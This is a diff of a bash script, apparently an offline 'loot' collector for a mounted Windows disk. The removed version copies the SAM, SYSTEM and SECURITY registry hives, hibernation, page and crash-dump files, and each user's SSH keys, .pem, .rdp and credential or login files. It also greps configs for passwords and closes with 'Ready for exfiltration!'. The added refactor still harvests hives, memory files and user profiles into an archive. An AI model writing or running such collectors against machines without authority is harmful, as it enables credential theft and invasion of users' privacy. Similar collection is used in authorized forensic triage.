@@ -1,190 +1,144 @@
 #!/bin/bash
-set -e
+set -euo pipefail
 
-echo "[*] Offline Collector"
-
+# Default configurations
 DATE=$(date +%Y%m%d_%H%M)
-MOUNT_WIN="/mnt/windows"
-LOOT_DIR="/mnt/pendrive/mona-collector"
+DEFAULT_USB_DEVICE="/dev/sdX"  # Replace with the default device if necessary
+DEFAULT_OUTPUT_DIR="$HOME/fast_looting_$DATE"
+MOUNT_DIR="/mnt/windows"
+LOG_FILE=""
 
-# Remove pasta anterior se existir e cria nova
-rm -rf "$LOOT_DIR" 2>/dev/null
-mkdir -p "$LOOT_DIR"/{registry,users,enum,memory,logs}
-
+# Logging function
 log() {
-    echo "[$(date '+%H:%M:%S')] $1"
+    local message="$1"
+    echo "[$(date '+%H:%M:%S')] $message" | tee -a "$LOG_FILE"
 }
 
+# Cleanup function to unmount and remove temporary directories
 cleanup() {
-    umount "$MOUNT_WIN" 2>/dev/null || true
+    log "Cleaning up..."
+    umount "$MOUNT_DIR" 2>/dev/null || true
+    rm -rf "$MOUNT_DIR"
 }
 
+# Error handling function
 error_exit() {
-    echo "[ERROR] $1"
+    log "[ERROR] $1"
     cleanup
     exit 1
 }
 
-trap cleanup EXIT
+# Check for required dependencies
+check_dependencies() {
+    local dependencies=("mount" "umount" "mkdir" "tar" "gzip" "lsblk")
+    for cmd in "${dependencies[@]}"; do
+        if ! command -v "$cmd" &>/dev/null; then
+            error_exit "Dependency not found: $cmd"
+        fi
+    done
+}
 
-log "[*] Iniciando coleta..."
+# Detect filesystem type and mount the USB device
+mount_usb() {
+    log "Detecting filesystem for USB device $USB_DEVICE..."
+    FS_TYPE=$(blkid -o value -s TYPE "$USB_DEVICE" 2>/dev/null || error_exit "Failed to detect filesystem type.")
+    log "Filesystem detected: $FS_TYPE"
 
-# Verificações
-if [ "$EUID" -ne 0 ]; then
-    error_exit "Execute como root"
-fi
+    log "Mounting USB device $USB_DEVICE..."
+    mkdir -p "$MOUNT_DIR"
 
-# Detecta disco Windows
-if [ -n "$1" ]; then
-    WIN_PART="$1"
-else
-    WIN_PART=$(lsblk -o NAME,FSTYPE | grep -i ntfs | awk '{print $1}' | head -n1 | sed 's/[├─└│]//g' | tr -d ' ')
-    if [ -z "$WIN_PART" ]; then
-        error_exit "Partição NTFS não encontrada. Use: $0 /dev/sdXX"
+    case "$FS_TYPE" in
+        ntfs)
+            mount -t ntfs "$USB_DEVICE" "$MOUNT_DIR" || error_exit "Failed to mount NTFS filesystem."
+            ;;
+        vfat)
+            mount -t vfat "$USB_DEVICE" "$MOUNT_DIR" || error_exit "Failed to mount FAT32 filesystem."
+            ;;
+        exfat)
+            mount -t exfat "$USB_DEVICE" "$MOUNT_DIR" || error_exit "Failed to mount exFAT filesystem."
+            ;;
+        *)
+            error_exit "Unsupported filesystem type: $FS_TYPE"
+            ;;
+    esac
+
+    log "USB device mounted at $MOUNT_DIR."
+}
+
+# Validate if the mounted device contains a valid Windows system
+validate_windows() {
+    log "Validating Windows system..."
+    if [ ! -d "$MOUNT_DIR/Windows/System32" ]; then
+        error_exit "Windows system not found on the mounted device."
     fi
-    WIN_PART="/dev/$WIN_PART"
-fi
+    log "Windows system validated."
+}
 
-log "[+] Partição: $WIN_PART"
+# Extract critical files from the mounted Windows system
+extract_files() {
+    log "Extracting files to $OUTPUT_DIR..."
+    mkdir -p "$OUTPUT_DIR"/{memory,registry,logs,users}
 
-# Monta disco
-mkdir -p "$MOUNT_WIN"
-if ! mount -t ntfs-3g -o ro,noexec,nodev,nosuid "$WIN_PART" "$MOUNT_WIN"; then
-    # Fallback para mount simples se ntfs-3g não funcionar
-    if ! mount -o ro "$WIN_PART" "$MOUNT_WIN"; then
-        error_exit "Falha ao montar $WIN_PART"
-    fi
-fi
+    # Copy memory dump files
+    cp -v "$MOUNT_DIR/pagefile.sys" "$OUTPUT_DIR/memory/" 2>/dev/null || log "pagefile.sys not found."
+    cp -v "$MOUNT_DIR/hiberfil.sys" "$OUTPUT_DIR/memory/" 2>/dev/null || log "hiberfil.sys not found."
 
-if [ ! -d "$MOUNT_WIN/Windows/System32" ]; then
-    error_exit "Windows não encontrado"
-fi
+    # Copy Windows registry files
+    cp -v "$MOUNT_DIR/Windows/System32/config/"* "$OUTPUT_DIR/registry/" 2>/dev/null || log "Registry files not found."
 
-log "[+] Windows montado"
+    # Copy system logs
+    cp -v "$MOUNT_DIR/Windows/System32/winevt/Logs/"* "$OUTPUT_DIR/logs/" 2>/dev/null || log "System logs not found."
 
-# Extrai registry
-log "[*] Copiando registry..."
-REGISTRY_FILES=("SAM" "SYSTEM" "SECURITY" "SOFTWARE")
-for reg_file in "${REGISTRY_FILES[@]}"; do
-    if [ -f "$MOUNT_WIN/Windows/System32/config/$reg_file" ]; then
-        cp "$MOUNT_WIN/Windows/System32/config/$reg_file" "$LOOT_DIR/registry/"
-        cp "$MOUNT_WIN/Windows/System32/config/$reg_file.LOG"* "$LOOT_DIR/registry/" 2>/dev/null || true
-    fi
-done
+    # Copy user profiles
+    cp -r "$MOUNT_DIR/Users/"* "$OUTPUT_DIR/users/" 2>/dev/null || log "User profiles not found."
 
-log "[+] Registry extraído"
+    log "File extraction completed."
+}
 
-# Coleta arquivos de memória (hiberfil, pagefile, dumps)
-log "[*] Copiando arquivos de memória..."
-mkdir -p "$LOOT_DIR/memory"
+# Compress the extracted files into a single tar.gz file
+compress_output() {
+    log "Compressing extracted files..."
+    tar -czf "$OUTPUT_DIR.tar.gz" -C "$OUTPUT_DIR" .
+    log "Compressed file created: $OUTPUT_DIR.tar.gz"
+}
 
-# hiberfil.sys - arquivo de hibernação
-if [ -f "$MOUNT_WIN/hiberfil.sys" ]; then
-    cp "$MOUNT_WIN/hiberfil.sys" "$LOOT_DIR/memory/"
-    log "[+] hiberfil.sys copiado ($(du -sh "$LOOT_DIR/memory/hiberfil.sys" | cut -f1))"
-fi
+# Display help message
+show_help() {
+    echo "Usage: $0 [-d USB_DEVICE] [-o OUTPUT_DIR]"
+    echo ""
+    echo "Options:"
+    echo "  -d USB_DEVICE   Specify the USB device to mount (default: $DEFAULT_USB_DEVICE)"
+    echo "  -o OUTPUT_DIR   Specify the output directory for extracted files (default: $DEFAULT_OUTPUT_DIR)"
+    echo "  -h              Show this help message"
+}
 
-# pagefile.sys - arquivo de paginação
-if [ -f "$MOUNT_WIN/pagefile.sys" ]; then
-    cp "$MOUNT_WIN/pagefile.sys" "$LOOT_DIR/memory/"
-    log "[+] pagefile.sys copiado ($(du -sh "$LOOT_DIR/memory/pagefile.sys" | cut -f1))"
-fi
+# Process command-line arguments
+process_args() {
+    USB_DEVICE="$DEFAULT_USB_DEVICE"
+    OUTPUT_DIR="$DEFAULT_OUTPUT_DIR"
 
-# swapfile.sys - arquivo de swap moderno
-if [ -f "$MOUNT_WIN/swapfile.sys" ]; then
-    cp "$MOUNT_WIN/swapfile.sys" "$LOOT_DIR/memory/"
-    log "[+] swapfile.sys copiado ($(du -sh "$LOOT_DIR/memory/swapfile.sys" | cut -f1))"
-fi
+    while getopts "d:o:h" opt; do
+        case "$opt" in
+            d) USB_DEVICE="$OPTARG" ;;
+            o) OUTPUT_DIR="$OPTARG" ;;
+            h) show_help; exit 0 ;;
+            *) show_help; exit 1 ;;
+        esac
+    done
 
-# MEMORY.DMP - dump completo de memória
-if [ -f "$MOUNT_WIN/MEMORY.DMP" ]; then
-    cp "$MOUNT_WIN/MEMORY.DMP" "$LOOT_DIR/memory/"
-    log "[+] MEMORY.DMP copiado ($(du -sh "$LOOT_DIR/memory/MEMORY.DMP" | cut -f1))"
-fi
+    LOG_FILE="$OUTPUT_DIR/fast_looting.log"
+}
 
-# Minidumps
-if [ -d "$MOUNT_WIN/Windows/Minidump" ]; then
-    cp -r "$MOUNT_WIN/Windows/Minidump" "$LOOT_DIR/memory/" 2>/dev/null
-    dump_count=$(find "$LOOT_DIR/memory/Minidump" -name "*.dmp" 2>/dev/null | wc -l)
-    if [ "$dump_count" -gt 0 ]; then
-        log "[+] $dump_count minidumps copiados"
-    fi
-fi
+# Main script flow
+main() {
+    trap cleanup EXIT
+    process_args "$@"
+    check_dependencies
+    mount_usb
+    validate_windows
+    extract_files
+    compress_output
+    log "Fast Looting process completed successfully."
+}
 
-# Crash dumps do System32
-find "$MOUNT_WIN/Windows/System32" -name "*.dmp" -exec cp {} "$LOOT_DIR/memory/" \; 2>/dev/null
-sys_dumps=$(find "$LOOT_DIR/memory" -maxdepth 1 -name "*.dmp" | wc -l)
-if [ "$sys_dumps" -gt 0 ]; then
-    log "[+] $sys_dumps crash dumps copiados"
-fi
-
-log "[+] Arquivos de memória processados"
-
-# Coleta dados de usuários
-log "[*] Coletando dados de usuários..."
-USERS=$(find "$MOUNT_WIN/Users" -maxdepth 1 -type d -not -path "$MOUNT_WIN/Users" | grep -v "All Users\|Default\|Public" || true)
-
-echo "$USERS" | while read -r user_path; do
-    if [ -n "$user_path" ] && [ -d "$user_path" ]; then
-        username=$(basename "$user_path")
-        user_archive="$LOOT_DIR/users/${username}.7z"
-        
-        cd "$user_path"
-        7z a -t7z -mx=9 -ms=on "$user_archive" \
-            .ssh/ *.key *.pem *.ppk *.rdp \
-            AppData/Local/*/Login* AppData/Roaming/*/credentials* \
-            Documents/ Desktop/ > /dev/null 2>&1 || true
-    fi
-done
-log "[+] Usuários processados"
-
-# Enumeração otimizada (apenas diretórios importantes)
-log "[*] Enumeração rápida..."
-{
-    # Busca chaves SSH/TLS apenas em pastas de usuários
-    find "$MOUNT_WIN/Users" -type f \( -name "*.key" -o -name "*.pem" -o -name "*ssh*" \) 2>/dev/null | head -10
-    
-    # Configs com senhas em Program Files e ProgramData
-    find "$MOUNT_WIN/Program Files" "$MOUNT_WIN/ProgramData" -name "*.xml" -o -name "*.config" 2>/dev/null | head -20 | xargs grep -l -i "password" 2>/dev/null | head -5
-    
-    # Backups importantes apenas em Users e raiz
-    find "$MOUNT_WIN/Users" "$MOUNT_WIN" -maxdepth 2 -name "*.bak" -o -name "*.backup" 2>/dev/null | head -10
-    
-    # Arquivos RDP e VPN em Users
-    find "$MOUNT_WIN/Users" -name "*.rdp" -o -name "*.ovpn" 2>/dev/null | head -10
-} > "$LOOT_DIR/enum/files.txt"
-
-# Copia logs importantes
-cp "$MOUNT_WIN/Windows/System32/winevt/Logs/Security.evtx" "$LOOT_DIR/logs/" 2>/dev/null || true
-cp "$MOUNT_WIN/Windows/System32/winevt/Logs/System.evtx" "$LOOT_DIR/logs/" 2>/dev/null || true
-cp "$MOUNT_WIN/Windows/System32/winevt/Logs/Application.evtx" "$LOOT_DIR/logs/" 2>/dev/null || true
-
-log "[+] Enumeração completa"
-
-# Compressão otimizada
-log "[*] Compactando com compressão otimizada..."
-cd "$HOME"
-
-# Usa gzip como método principal (mais rápido e confiável)
-log "[*] Usando gzip com compressão balanceada..."
-GZIP=-6 tar -czf "mona-collector_$DATE.tar.gz" "mona-collector/"
-FINAL_FILE="mona-collector_$DATE.tar.gz"
-
-# Finalização
-log "[+] Coleta finalizada: $LOOT_DIR"
-du -sh "$LOOT_DIR"/*
-log "[+] Total original: $(du -sh "$LOOT_DIR" | cut -f1)"
-log "[+] Arquivo compactado: $FINAL_FILE"
-log "[+] Tamanho final: $(du -sh "$HOME/$FINAL_FILE" | cut -f1)"
-
-# Calcula taxa de compressão
-ORIGINAL_SIZE=$(du -sb "$LOOT_DIR" | cut -f1)
-COMPRESSED_SIZE=$(du -sb "$HOME/$FINAL_FILE" | cut -f1)
-COMPRESSION_RATIO=$((100 - (COMPRESSED_SIZE * 100 / ORIGINAL_SIZE)))
-log "[+] Taxa de compressão: ${COMPRESSION_RATIO}%"
-
-
-echo "               🌸 Data collected successfully! 🌸"
-echo "                     File: $FINAL_FILE"
-echo "                  Ready for exfiltration! 💖"
-echo ""
+main "$@"
